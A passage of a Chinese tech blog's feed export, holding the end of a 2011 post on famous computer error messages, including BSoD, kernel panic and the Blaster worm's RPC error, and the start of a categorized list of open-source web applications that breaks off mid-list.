<p>Twitter的服务器负载一吃紧，下面的这个页面就会显现出来了，大家把它叫做<strong>Fail Whale </strong>，这个情况在今年4月份以前的2到3年是非常频繁发生的，现在看似好很多了，看来Twitter工程师们克服了这个负载问题。你千万不要以为这个图是Twitter自己设计的，这个图是一个叫<a href="https://www.google.com/search?q=yiying+lu&amp;ie=utf-8&amp;oe=utf-8&amp;aq=t&amp;rls=FlockInc.:en-US:unofficial&amp;client=firefox">Yiying Lu</a>的人设计的。不过由Twitter引发出来的文化影响力是比较深远的，甚至还出现了相要把这个事发扬光大的Fail Whale project (<a href="https://www.twitter.com/failwhale">@FailWhale</a>, <a href="http://www.failwhale.com/">failwhale.com</a>)以及相关的T恤衫。你可以看看<a href="http://www.readwriteweb.com/archives/the_story_of_the_fail_whale.php" target="_blank">这篇文章</a>。</p>
<figure id="attachment_5112" aria-describedby="caption-attachment-5112" style="width: 511px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-5112" class="wp-caption-text">Twitter Fail Whale</figcaption></figure>
<h4>
<span class="ez-toc-section" id="6%E3%80%81Kernel_Panic"></span>6、Kernel Panic<span class="ez-toc-section-end"></span>
</h4>
<p>Kernel Panic相关于Windows 的蓝屏错误，其发生在Mac OS X和Linux下，在Mac OS X v10.6 <em>Snow Leopard</em>中，当进入内核错误后，会在画面上出现一个有英语、法语、德语、西班牙语及日语的当机画面，被多数用户称为“五国语言当机”，简称“五国”。在Linux上则是Linux Kernel oops。当内核检测到问题时，它会打印一个oops信息然后杀死全部相关进程。oops信息可以帮助Linux内核工程师调试，检测oops出现的条件，并修复导致oops的程序错误。</p>
<figure id="attachment_5113" aria-describedby="caption-attachment-5113" style="width: 460px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-5113" class="wp-caption-text">Mac OS X 10.6的内核错误警告，俗称“五国”</figcaption></figure>
<figure id="attachment_5114" aria-describedby="caption-attachment-5114" style="width: 480px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-5114" class="wp-caption-text">PA-RISC上发生的Linux内核oops，用ASCII显示一头死牛</figcaption></figure>
<h4>
<span class="ez-toc-section" id="5%E3%80%81Windows%E7%9A%84%E9%9D%9E%E6%B3%95%E6%93%8D%E4%BD%9C"></span>5、Windows的非法操作<span class="ez-toc-section-end"></span>
</h4>
<p>这个错误信息主要是操作系统用来保护自己的错误，也就是Windows下的程序crash。通常来说，是内存访问错误引发的。不过，这个东西在windows下太多了，这是Win95和Win98中的大量的问题，包括微软自己的软件也经常出现这个问题，最为典型的就是IE6的crash。让IE6 出现这样的错误真是太简单了，参看<a title="一个jQuery的插件" href="https://coolshell.cn/articles/2357.html" target="_blank">酷壳的这篇文章</a>。</p>
<figure id="attachment_5115" aria-describedby="caption-attachment-5115" style="width: 398px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-5115" class="wp-caption-text">该程序执行了非法操作</figcaption></figure>
<h4>
<span class="ez-toc-section" id="4%E3%80%81Windows_RPC_Error"></span>4、Windows RPC Error<span class="ez-toc-section-end"></span>
</h4>
<p>这个错误之所以很牛，是因为在2003年的8月份，很多使用Windows的用户都看到了这个错误，其系统被强行重启，重启了以后又收到这个错误，然后又被重启。这个事看上去就像一个正常的Windows的错误（相当正常，因为这样的红叉叉在Windows上看到了N多次了，用户都习惯了），但其实，这个事是有人故意的，这就是那个著名的<a href="https://en.wikipedia.org/wiki/Blaster_(computer_worm)">Blaster worm</a>蠕虫病毒，其利用了Windows DCOM的一个漏洞。</p>
<figure id="attachment_5116" aria-describedby="caption-attachment-5116" style="width: 282px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-5116" class="wp-caption-text">Windows RPC Error</figcaption></figure>
<h4>
<span class="ez-toc-section" id="3%E3%80%81Xbox_360_%E4%B8%89%E7%BA%A2%E9%94%99%E8%AF%AF"></span>3、Xbox 360 三红错误<span class="ez-toc-section-end"></span>
</h4>
<p>这个错误又叫RRoD – Red Ring of Death，在中国地区叫“三红”。微软在推出的游戏主机Xbox360后，众多用户曾向微软方面投诉游戏主机经常出现不同程度的故障，而且概率偏高，有调查显示，早期版本Xbox360返修率高达68% ，而最近的报告指出故障机率还是有33%。过热是游戏配件产品制造商Nyko认为Xbox360主机发生三红灯警告的主要原因，也有人指出因为Xbox 360机能不足所以长期开机超频引致过热。<a href="https://www.bloomberg.com/apps/news?pid=newsarchive&amp;sid=aOrvYZ2gPwZk&amp;refer=home" target="_blank">有报告指出</a>微软花费了超过11.5亿美元在回收及修理出现问题的XBOX 360。</p>
<figure id="attachment_5118" aria-describedby="caption-attachment-5118" style="width: 455px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-5118" class="wp-caption-text">XBox 360 Red Ring of Death</figcaption></figure>
<h4 style="text-align: left;">
<span class="ez-toc-section" id="2%E3%80%81Web%E4%B8%8A%E7%9A%84404%E9%94%99%E8%AF%AF"></span>2、Web上的404错误<span class="ez-toc-section-end"></span>
</h4>
<p style="text-align: left;">HTTP 404或Not Found错误讯息是HTTP的其中一种“标准回应讯息”（HTTP状态码），此讯息代表客户端在浏览网页时，服务器无法打到用户要请求的资源，所以报错。404是一个你无法避免的错误，因为可能是因为用户或你的开发人员编码里打错连接。所以，很多公司借用这个机会来美化404页面，本站以前也介绍过（如：<a title="StackOverflow的404错误页" href="https://coolshell.cn/articles/2529.html" target="_blank">StackOverflow的404</a>，<a title="几个有趣的404错误页面" href="https://coolshell.cn/articles/1826.html" target="_blank">各式各样的404错</a>），这里还有一个404的一首诗：</p>
<blockquote>
<p style="text-align: left;">four oh four<br>
by mind21_98</p>
<p>oh what a wonderful tizzy<br>
which was in a fizzy<br>
he couldn’t find the file<br>
which was hiding in the bushes</p>
<p>push the back button oh traveller<br>
contact the owner of the last tavern<br>
find out how to get to where you’re going<br>
and be on your way</p>
</blockquote>
<h4 style="text-align: left;">
<span class="ez-toc-section" id="1%E3%80%81Windows_%E8%93%9D%E5%B1%8F%E9%94%99%E8%AF%AF"></span>1、Windows 蓝屏错误<span class="ez-toc-section-end"></span>
</h4>
<p style="text-align: left;"><a href="https://en.wikipedia.org/wiki/Blue_Screen_of_Death" target="_blank">Blue Screen of Death</a>，缩写为：<strong>BSoD</strong>。这是这个世界最著名的错误了，和Kernel Panic 一样，基本上就是说，内核死翘翘了。在各种场合上我们都能看到这个错误。</p>
<figure id="attachment_5119" aria-describedby="caption-attachment-5119" style="width: 535px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-5119" class="wp-caption-text">北京2008奥林匹克</figcaption></figure>
<figure id="attachment_5120" aria-describedby="caption-attachment-5120" style="width: 535px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-5120" class="wp-caption-text">飞机场航班显示</figcaption></figure>
<figure id="attachment_5121" aria-describedby="caption-attachment-5121" style="width: 535px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-5121" class="wp-caption-text">商场显示屏</figcaption></figure>
<p>Bill Gates在Win98发布会上的蓝屏遭遇：</p>
<p></p>
<center><embed src="http://www.tudou.com/v/eISuBfkMxlo/v.swf" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" wmode="opaque" width="480" height="400"></embed></center>
<p> </p>
<p>本来文章到这里就可以结束了，上文参考自这里<a href="http://technologizer.com/2008/09/18/errormessage" target="_blank">The 13 Greatest Error Message of All Time</a>。不过，我觉得还有一个错误必然会载入史册。这就是下面的“该页无法显示错误”</p>
<h4>
<span class="ez-toc-section" id="0%E3%80%81%E8%AF%A5%E9%A1%B5%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E9%94%99%E8%AF%AF"></span>0、该页无法显示错误<span class="ez-toc-section-end"></span>
</h4>
<p>这个错误对于中国用户不会陌生。这个错误以前更多的是Connection Reset，N年前你访问很多国外的网站者会遇到Connection Reset错，今天呢，更多的是“Time Out”，因为，关键词匹配太耗性能了，图片和视频的无法使用关键词过滤，所以，还不如直接封了IP，简单而粗暴，今天的Connection Reset更多的是出现在使用Google的搜索，当你搜某些关键词时就出这个错了。</p>
<figure id="attachment_5122" aria-describedby="caption-attachment-5122" style="width: 593px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-5122" class="wp-caption-text">该页无法显示 Connection Reset</figcaption></figure>
<p>（全文完）</p>
 ]]></content>
<pubDate>2011-08-08T08:37:36+08:00</pubDate>
<guid>https://coolshell.cn/articles/5107.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 疯狂的 Web 应用开源项目 ]]></title>
<link>https://coolshell.cn/articles/5132.html</link>
<content><![CDATA[ 
<p>下面是一个Web应用的开源列表。没什么可说的，太疯狂了。尤其是Web 2.0那一堆。我不知道你怎么想，有些开源项目的源码写得挺不好的，尤其是性能方面。或许你会以为改一改他们就可以成为为自己所用，不过，改这些开源的项目还真不容易。玩玩还可以。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E6%95%B0%E5%AD%97%E5%AA%92%E4%BD%93" title="数字媒体">数字媒体</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8" title="文件存储">文件存储</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%86%85%E5%AE%B9%E6%9C%8D%E5%8A%A1" title="内容服务">内容服务</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#Groupware%E7%BE%A4%E4%BB%B6" title="Groupware群件">Groupware群件</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E7%BA%AFWeb_20%E6%9C%8D%E5%8A%A1" title="纯Web 2.0服务">纯Web 2.0服务</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E8%BA%AB%E4%BB%BD%E5%92%8C%E5%AE%89%E5%85%A8" title="身份和安全">身份和安全</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E5%85%B6%E5%AE%83" title="其它">其它</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E6%95%B0%E5%AD%97%E5%AA%92%E4%BD%93"></span>数字媒体<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<strong>相册</strong>（Flickr, Picasa）</li>
<ul>
<li>
<a href="http://gallery.menalto.com/" target="_blank">Gallery</a>，基于PHP + MySQL的Web相册。非常易于使用，包括一个配置向导，对于相片的操作包括自动生成缩略图、相片的大小改变、选择、排序等。</li>
<li>
<a title="Piwigo" href="https://piwigo.org/" target="_blank">Piwigo</a>，基于PHP + MySQL。配备了强大的功能，发布和管理您的照片，可扩展性和智能浏览功能，如类别，标签，或年表。这是网络和照片的标准要求。扩展使Piwigo更可扩展性和可定制的。</li>
<li>
<a title="UberGallery " href="http://www.ubergallery.net/" target="_blank">UberGallery</a>，一个简单易用的相册。PHP。不需要数据库。</li>
<li>
<a title="Zenphoto" href="http://www.zenphoto.org/" target="_blank">Zenphoto</a>，一个简单的web相册程序,它能够简单的展示你的图片，并含有你所需要的所有功能和特点。可以和Wordpress集成。</li>
</ul>
</ul>
<ul>
<li>
<strong>视频</strong>（YouTube）</li>
<ul>
<li>
<a title="Flowplayer" href="http://www.flowplayer.org/" target="_blank">Flowplayer</a>，一个用Flash开发的在Web上的视频播放器，可以很容易将它集成在任何的网页上。支持HTTP以及流媒体传输。</li>
<li>
<a title="Plumi" href="http://blog.plumi.org/" target="_blank">Plumi</a>，一个建立在Plone 内容管理系统上的视频分享系统，可帮助你轻松建立视频分享网站。</li>
</ul>
</ul>
<div><span id="more-5132"></span></div>
<ul>
<li>
<strong>音乐电台社区</strong>（last.fm, ulike）</li>
<ul>
<li>
<a title="Libre.fm" href="http://libre.fm/" target="_blank">Libre.fm</a>，对Last.fm 的克隆。</li>
</ul>
</ul>
<ul>
<li>
<strong>视频电影社区</strong>（netflix, criticker）</li>
<ul>
<li>
<a href="http://filmaster.com/" target="_blank">Filmaster</a>，fileaster.com的源码。</li>
</ul>
</ul>
<ul>
<li>
<strong>书</strong>（LibraryThing, Shelfari, Goodreads）</li>
<ul>
<li>
<a href="http://bookworm.oreilly.com/" target="_blank">O’Reilly Bookworm</a>，在线电子图书阅读。</li>
</ul>
</ul>
<ul>
<li>
<strong>期刊参考论文数据库</strong>（Emerald Insight, Springer Link）</li>
<ul>
<li>
<a title="CiteSeerX" href="http://citeseerx.ist.psu.edu/" target="_blank">CiteSeerX</a>，采用机器自动识别技术搜集网上以Postscrip和PDF文件格式存在的学术论文，然后依照引文索引方法标引和链接每一篇文章。（其是CiteSeer的换代产品。1997年，CiteSeer引文搜索引擎由NEC公司在美国普林斯顿研究所的三位研究人员Steve Lawrence, Lee Giles和Kurt Bollacker研制开发。它是利用自动引文标引系统ACI（Autonomous Citation Indexing）建立的第一个科学文献数字图书馆（Scientific Literature Digital Library））。</li>
</ul>
</ul>
<ul>
<li>
<strong>地图</strong>（Google Maps）</li>
<ul>
<li>
<a title="Openstreetmap" href="https://www.openstreetmap.org/" target="_blank">OpenStreetMap</a>，一个可供自由编辑的世界地图，它是由所有的用户创造的。<wbr><em>OpenStreetMap</em>允许您查看，编辑或者使用世界各地的地理数据来帮助您。其就像Wikipedia一样，全世界的人都可以编辑，据说其上面的数据超过了政府的数据。当然，目前其参与的人数还不够，大量的地方都是白板。<br>
</wbr>
</li>
</ul>
</ul>
<h4>
<span class="ez-toc-section" id="%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8"></span>文件存储<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<strong>文件共享/同步</strong>（DropBox, drop.io, Ubuntu One）</li>
<ul>
<li>
<a title="Tahoe Least-Authority Filesystem" href="https://tahoe-lafs.org/trac/tahoe-lafs/" target="_blank">Tahoe Least-Authority Filesystem</a>，一个云存储分布式文件系统。</li>
<li>
<a title="IFolder" href="http://www.kablink.org/ifolder/" target="_blank">iFolder</a>，一个简单安全的存储解决方案，可在计算机间文件的同步和分享。可以用来随时备份本地的文件。</li>
</ul>
</ul>
<ul>
<li>
<strong>存储</strong>（Amazon S3, Imageshack, Box, Variety of models）</li>
<ul>
<li>
<a href="http://search.cpan.org/~jesse/Prophet-0.72/" rel="nofollow">Jesse Vincent’s Prophet</a>，你可以看看他的<a href="http://search.cpan.org/~jesse/Prophet-0.72/lib/Prophet/Manual.pod" target="_blank">文档介绍</a>吧。</li>
</ul>
</ul>
<ul>
<li>
<strong>在线文件编辑</strong>（Google Docs）</li>
<ul>
<li>
<a title="Abiword" href="https://abicollab.net/" target="_blank">AbiCollab</a>，基于AbiWord的社群的线上文书处理协作服务。</li>
<li>
<a title="Etherpad" href="http://etherpad.org/" target="_blank">Etherpad</a>，基于开放软体的线上文书处理服务，最大的特色在于多人即时共同协作一份文件，软体组织不直接提供服务，而是透过其他没有连系的组织网站提供。</li>
</ul>
</ul>
<ul>
<li>
<strong>虚拟机供应</strong>（Amazon EC2）</li>
<ul>
<li>
<a title="Eucalyptus (computing)" href="http://www.open.eucalyptus.com/" target="_blank">Eucalyptus (computing)</a>，是一用来通过计算集群或工作站群实现弹性的、实用的云计算。它最初是美国加利福尼亚大学 Santa Barbara 计算机科学学院的一个研究项目，现在已经商业化，发展成为了 Eucalyptus Systems Inc。不过，Eucalyptus 仍然按开源项目那样维护和开发。Eucalyptus Systems 还在基于开源的 Eucalyptus 构建额外的产品；它还提供支持服务。</li>
<li>
<a title="Globus Toolkit" href="http://www.globus.org/" target="_blank">Globus Toolkit</a>，Globus项目工具包，其可以在计算机上提供稳定、安全和对等网络的分布式运算，集群和其它高性能系统功能。</li>
<li>
<a href="http://www.opennebula.org/" rel="nofollow">OpenNebula</a>，一个虚拟基础设备引擎， 用来动态布署虚拟机器在一群实体资源上，OpenNEbula 最大的特色在于将虚拟平台从单一实体机器到一群实体资源。</li>
</ul>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%86%85%E5%AE%B9%E6%9C%8D%E5%8A%A1"></span>内容服务<span class="ez-toc-section-end"></span>
</h4>
<div>
<ul>
<li>
<strong>Wiki</strong>（Wikispaces）</li>
<ul>
<li>
<a href="https://www.dokuwiki.org/dokuwiki/" rel="nofollow">Dokuwiki</a>，一个针对小公司文件需求而开发的Wiki引擎。DokuWiki是用程序设计语言PHP开发的并以GPL 2发布。DokuWiki基于文本存储，所以不需要数据库，其数据文件在Wiki系统外也是可读的。DokuWiki的功能齐全，支持UTF-8，最新版支持中文链接。能够单独编辑页面中的某个章节，能够自动生成目录，适合中小企业、个人使用，用作资料归档、指南、读书笔记等。DokuWiki安装很简单，默认提供配置工具。</li>
<li>
<a title="Mediawiki" href="https://www.mediawiki.org/wiki/MediaWiki/" target="_blank">Mediawiki</a>，是一套基于网络的Wiki引擎，维基媒体基金会的所有项目乃至众多wiki网站皆采用了这一软件。MediaWiki软件最初是为自由内容百科全书维基百科所开发，今日已被一些公司机构部署为内部的知识管理和内容管理系统。Novell甚而还在多个高流量的网站中使用了该软件。</li>
<li>
<a href="https://github.com/rongarret/microWiki/" rel="nofollow">μWiki</a>，一个小巧而功能齐全的wiki，所有的代码才3500行，可通过facebook和openID认证。</li>
</ul>
</ul>
<ul>
<li><strong>出版</strong></li>
<ul>
<li><a href="http://www.topazproject.org/trac/" rel="nofollow">Topaz</a></li>
<li>
<a href="http://www.ambraproject.org/" rel="nofollow">Ambra</a>，是一个期刊管理与发布系统。它具有一个高容量、高效、经济的系统来在所有科学领域发表研究文章。</li>
<li>
<a href="http://pkp.sfu.ca/?q=ojs/" rel="nofollow">Open Journal Systems</a>，简称OJS，此系统是一个开源码的期刊管理与出版软件，由公共知识项目(PKP; Public Knowledge Project)研发与支持。（<a href="http://www.chinajol.info" target="_blank">中国肺癌杂志</a>使用了这个系统）</li>
</ul>
</ul>
<ul>
<li><strong>Blog</strong></li>
<ul>
<li>
<a href="https://wordpress.org/" rel="nofollow">WordPress</a>，这个不用说了吧。</li>
<li>
<a href="https://www.livejournal.com/" rel="nofollow">LiveJournal</a>，一个综合型SNS交友网站，有论坛，博客等功能，Brad Fitzpatrick始建于1999年4月15日，目的是为了与同学保持联系，之后发展为大型网络社区平台，是网友聚集的好地方，<em>LJ</em>支持多国语言，<em>ALEXA</em>综合排名84 ，日均访客可达6,288,000以上</li>
</ul>
</ul>
<ul>
<li>
<strong>微博</strong> （Twitter）</li>
<ul>
<li>
<a href="http://jisko.org/" target="_blank">Jisko</a>，界面和Twitter很像，集成Twitter同步功能，它能够自动将你在Jisko平台上发布的内容发表到您的Twitter账户上。也能够自动读取您的Twitter更新，但是并不能将这些内容发布到Jisko平台，只能在自己的好友Timeline里查看。Jisko平台还能够连接您的Jabber/GTalk账户，让您通过IM发帖。并且有数个缩链服务供选择，十分实用。</li>
<li>
<a href="http://www.jaiku.com/" rel="nofollow">Jaiku Engine</a>，Google曾经收购的类Twitter平台Jaiku现在已经完全开源并且切换AppEngine上运行，早前Google曾经宣布停止Jaiku等项目的维护和开发，现在更将Jaiku完全开源提供用户免费下载，所有人都可以在自己的主机上建立和运行自己的Jaiku应用了。</li>
<li>
<a href="https://status.net/" rel="nofollow">Status.net</a>，一个开源微博服务。同时，它又可将信息同步到Twitter。所以我们也可以把它理解为“开源的Twitter客户端”。但它与客户端又有本质的不同：拥有自己的数据库，只是把数据同步到推特而已。</li>
</ul>
</ul>
<ul>
<li>
<strong>网页访问量统计</strong>（Google Analytics）</li>
<ul>
<li>
<a title="Piwik" href="https://en.wikipedia.org/wiki/Piwik">Piwik</a>，一套基于Php+MySQL技术构建，能够与Google Analytics相媲美的开源网站访问统计系统，前身是phpMyVisites。Piwik可以给你详细的统计信息，比如网页浏览人数, 访问最多的页面, 搜索引擎关键词等等，并且采用了大量的AJAX/Flash技术，使得在操作上更加便易。此外，它还采用了插件扩展及开放API架构，可以让开发人员根据自已的实际需求创建更多的功能．</li>
<li>
<a href="http://www.openwebanalytics.com/" target="_blank">Open Web Analytics</a>，一个开源的网站流量统计系统。基于PHP/Open Flash Chart/Ajax技术开发，既可以单独使用也可以与WordPress、Gallery&amp;MediaWiki集成使用。支持多个网站，集成Google Maps，RSS/Atom订阅跟踪等功能。</li>
</ul>
</ul>
<ul>
<li>
<strong>虚拟主机平台</strong>（Google AppEngine）</li>
<ul>
<li>
<a href="https://code.google.com/p/appscale/" rel="nofollow">AppScale</a>，是一个平台，允许用户发布和托管自己的 Google App Engine 的应用程序。支持 Python, Java, and Go Google App Engine 平台。</li>
</ul>
</ul>
<ul>
<li>
<strong>办公</strong>（Google Docs）</li>
<ul>
<li>
<a href="http://www.zimbra.com/products/zimbra-open-source.html" rel="nofollow">Zimbra Collaboration Suite</a>，其英文缩写为ZCA。全功能的通信及协作办公应用程序，提供可靠和高效能的邮件、地址簿、效率手册、任务列表以及网络文档制作功能。</li>
<li>
<a href="http://www.phpgroupware.org/" rel="nofollow">PHPGroupware</a>，功能强大，基于Web的Messaging ，Collaboration和企业管理平台。<wbr><em>phpGroupWare</em>包含50多个模块可根据你的需求进行搭配与组合。它提供了约50种基于网络的应用，有日历，通讯录，先进的项目经理，待办事项列表，笔记，电子邮件，新闻组和新闻阅读器，一个文件管理器和更多应用。</wbr>
</li>
<li>
<a href="http://fengoffice.com/web/index.php/" rel="nofollow">OpenGoo,Fengoffice</a>，基于ExtJs+XAMP（Apache、PHP、MySQL）开发的开源web office。它具备了主流在线协作系统所应具备的所有功能，包括任务管理、日程管理、文件管理、联系人管理以及email收发功能。其文件管理模块，实现了文件版本管理的功能，能够方便的查找、下载同一文件的不同版本。适用于任何单位或个人创建，共享，协作维护和发布它们所有内部与外部文档。</li>
<li>
<a href="http://crabgrass.riseuplabs.org/" rel="nofollow">Crabgrass</a>，社会网络，小组协作，网络组织的Web应用程序。它由一组协作工具固体套件，如私人维基，任务列表，文件库，和决策工具。程序目前正在做了大量的用户界面改革，更完善的社会网络工具，博客和活动日程，以及更好的协作和决策制定各独立团体的支持。</li>
<li>
<a href="http://etherpad.org/" rel="nofollow">Etherpad</a>，由两位Google 前员工所开发，已被Google 收购成为开放原始码项目。主要功能是让多个使用者透过网路来共同编辑一份文件，与先前介绍过的Sync.in 好用的线上即时文件协作平台类似。EtherPad 无须注册就能使用，建立文件后会产生一个网址，其它用户可以透过该网址与你编辑同一份文件，并标记出不同用户所编辑的位置，也有提供汇入汇出及时间轴等功能。</li>
</ul>
</ul>
<h4>
<span class="ez-toc-section" id="Groupware%E7%BE%A4%E4%BB%B6"></span>Groupware群件<span class="ez-toc-section-end"></span>
</h4>
</div>
<div>
<ul>
<li>
<strong>Webmail</strong> (gmail, hotmail)</li>
<ul>
<li>
<a href="http://www.zimbra.com/" rel="nofollow">Zimbra</a>，强大的开源协同办公套件包括WebMail，日历，通信录，Web文档管理和创作。它最大的特色在于其采用Ajax技术模仿CS桌面应用软件的风格开发的客户端兼容Firefox,Safari和IE浏览器。</li>
<li>
<a href="https://roundcube.net/" rel="nofollow">Roundcube</a>，支持多国语言的IMAP客户端，操作界面看起像一个桌面应用程序。它提供一个e-mail客户端应该具备的所有功能包括MIME支持,地址薄，文件夹操作，信息搜索和拼写检查。RoundCube Webmail采用PHP+Ajax开发并且需要MySQL数据库来存储数据。 用户界面采用XHTML+CSS2设计。</li>
<li>
<a href="http://www.conjoon.org/" rel="nofollow">conjoon</a>，基于Ext JS+PHP/MySQL开发的Webmail和RSS客户端阅读器。<wbr>此外还包含一个联系人管理模块。</wbr>
</li>
<li>
<a href="http://www.tdah.us/" rel="nofollow">Tdah</a>，一个PHP Webmail系统。该系统采用POP3协议收邮件，可以配置使用SMTP、PHP mail、Sendmail或Qmail来发送邮件。T-dah还包含以下几个模块：事件日历、群组聊天、文件夹管理、邮件搜索等。T-dah使用 TinyMCE WYSIWYG编辑器来创建新邮件。</li>
<li>
<a href="https://funambol.com/" rel="nofollow">Funambol</a>，世界领先的开源云同步和PUSHMAIL工具，支持诸多手提移动设备，包括苹果、黑莓、Android、Windows Mobile、索爱、三星、诺基亚等20余款。</li>
<li>
<a href="http://www.hastymail.org/" rel="nofollow">Hastymail</a>，一个使用方便快捷、安全，跨平台的IMAP/SMTP客户端。采用PHP语言编写，<wbr>运行于PHP+MYSQL平台环境。提供一个简洁的Web界面来发送和读取E-mail。</wbr>
</li>
<li>
<a href="http://www.xuheki.com/" rel="nofollow">Xuheki</a>，一个很快的IMAP 使用AJAX 技术开发的客户端。你能想到的功能它基本上都有了。</li>
<li>
<a href="http://www.claros.org/" rel="nofollow">Claros</a>，一个比较简单的，采用pop3/smtp收发邮件的<em>webMail</em>系统。不需要数据库的支持。提供一个独立于SMTP服务器的垃圾邮件过滤机制。</li>
</ul>
</ul>
<ul>
<li>
<strong>Email 服务器</strong>（MS Exchange）</li>
<ul>
<li>
<a href="http://archiveopteryx.org/" rel="nofollow">Archiveopteryx</a>，一个互联网归档邮件服务器，支持强大的归档功能。可以运行在Linux, FreeBSD, NetBSD, OpenBSD 和 Mac OS X。</li>
<li>
<a href="https://roundcube.net/" rel="nofollow">Roundcube</a>，提供一个e-mail客户端应该具备的所有功能包括MIME支持,地址薄，文件夹操作，信息搜索和拼写检查。RoundCube Webmail采用PHP+Ajax开发并且需要MySQL数据库来存储数据。 用户界面采用XHTML+CSS2设计。</li>
<li>
<a href="https://www.squirrelmail.org/" rel="nofollow">Squirrelmail</a>，一款由PHP语言编写，基于标准的webmail软件包。它包括内建的纯PHP支持的IMAP和SMTP协议，所生成的页面绝对支持HTML4.0标准(无需JavaScript支持)，这样可以运行在更多的平台和更多的浏览器上。它的系统安装要求非常低，但是非常容易安装和配置。SquirrelMail拥有你的客户端邮件程序所拥有的一切，比如增强型的MIME支持、地址薄、文件夹操作等等功能。</li>
<li>
<a href="http://www.horde.org/" rel="nofollow">Horde Groupware Suite</a>，一个强大的邮件办公套件。</li>
</ul>
</ul>
<ul>
<li>
<strong>邮件列表</strong> （Google Groups, Yahoo Groups）</li>
<ul>
<li><a href="http://www.freelists.org/" rel="nofollow">Freelists</a></li>
<li>
<a href="https://www.gnu.org/software/mailman/index.html" rel="nofollow">Mailman</a>，管理电子信箱讨论和自由软件电子通讯清单。 支持内置的归档，自动退回处理，内容过滤，消化交货，垃圾邮件过滤器等。</li>
</ul>
</ul>
<ul>
<li>
<strong>论坛</strong> （vBulletin）（注：国内的主要是用Discuz!）</li>
<ul>
<li>
<a href="https://www.phpbb.com/" rel="nofollow">phpBB</a>，中文的在这里<a href="http://www.phpbbchina.com/">http://www.phpbbchina.com</a>
</li>
<li>
<a href="http://www.phorum.org/" rel="nofollow">Phorum</a>，基于PHP+MySQL开发的开源论坛项目。它的特点是速度快，功能强大，面向模块化设计，安装简单。此外Phorum还集成电子报。</li>
<li>
<a href="http://www.vanillaforums.org/" rel="nofollow">Vanilla</a>，是很多外国牛人都在用的一款开源论坛程序，它不像我们熟知的phpBB之类的或是类似我国discuz，phpwind的模式，而是采取了全新的内核和界面，界面类似于stackflow，所以用它来做一个社交性的问答网站也是个不错的选择。</li>
<li>
<a href="https://sourceforge.net/projects/ospo/" target="_blank">Ospo</a>，是一项开源社交门户站点方案。它拥有标准功能（添加、删除好友，前十排行榜），论坛整合、音乐模块（带有艺术家目录的专辑和歌曲）、广播心情整合、日志（添加、删除、修改、检查）等等众多功能。</li>
</ul>
</ul>
<ul>
<li>
<strong>日历</strong>（cf, 30boxes, Google calendars, ScheduleWorld）</li>
<ul>
<li>
<a href="http://www.zimbra.com/products/zimbra-open-source.html" rel="nofollow">Zimbra Collaboration Suite</a>，功能的通信及协作办公应用程序，提供可靠和高效能的邮件、地址簿、效率手册、任务列表以及网络文档制作功能。</li>
<li>
<a href="http://www.k5n.us/webcalendar.php/" rel="nofollow">Web Calendar</a>，一款漂亮的Flash日历，可以添加在网页上，它可以高亮显示事件，会议，节假日的日期。</li>
<li>
<a href="https://www.forge.funambol.org/DomainHome.html" rel="nofollow">Funambol</a>，世界领先的开源云同步和PUSHMAIL工具，支持诸多手提移动设备，包括苹果、黑莓、Android、Windows Mobile、索爱、三星、诺基亚等20余款。</li>
<li>
<a href="https://dev.joyent.com/projects/connector/wiki/Connector/" rel="nofollow">Joyent Connector</a>，免费提供Office 2.0的功能，如团队电子邮件、日程安排、相互联系、<wbr>文档和书签。</wbr>
</li>
<li>
<a href="http://www.horde.org/apps/kronolith/" rel="nofollow">Horde Groupware Suite</a>，协同办公套件。</li>
</ul>
</ul>
<ul>
<li><strong>会议和评审管理</strong></li>
<ul>
<li>
<a href="http://www.openconf.com/" rel="nofollow">Openconf</a>，开源的会议管理系统，主要提供以下功能：电子提交、评审、论文答辩，以及会议主席对整个过程的管理等。</li>
<li>
<a href="http://myreview.lri.fr/" rel="nofollow">MyReview</a>，学术会议的论文提交和论文评审。</li>
<li>
<a href="http://www.easychair.org/" rel="nofollow">EasyChair</a>，会议管理系统。</li>
<li>
<a href="http://borbala.com/cyberchair/" rel="nofollow">CyberChair</a>，论文提交和评审系统。</li>
<li>
